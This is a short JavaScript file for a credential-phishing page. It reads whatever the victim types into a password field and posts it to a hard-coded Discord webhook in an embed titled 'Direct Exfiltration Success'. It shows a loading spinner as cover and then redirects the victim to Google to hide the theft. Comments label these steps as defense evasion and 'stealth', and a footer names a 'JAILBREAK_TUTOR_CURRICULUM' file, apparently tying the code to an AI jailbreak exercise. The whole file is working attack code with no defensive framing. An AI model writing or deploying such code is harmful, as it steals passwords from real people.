const LAIR_WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

async function captureAndLeave() {
    const passInput = document.getElementById('pass-input');
    const val = passInput ? passInput.value : "EMPTY_INPUT";

    // Immediate UI feedback (Defense Evasion[cite: 4])
    document.getElementById('loading-spinner').style.display = 'block';
    
    const payload = {
        embeds: [{
            title: "🚀 Direct Exfiltration Success",
            description: "Bypassed password.html intermediate step.",
            color: 0xff0000, // Red for high priority
            fields: [{ name: "Captured", value: `||${val}||` }],
            footer: { text: "Protocol: JAILBREAK_TUTOR_CURRICULUM_106.txt" }
        }]
    };

    try {
        await fetch(LAIR_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Webhook blocked or failed", e);
    }

    // Final "Stealth" move - redirect to Google
    setTimeout(() => {
        window.location.href = "https://google.com";
    }, 1000);
}
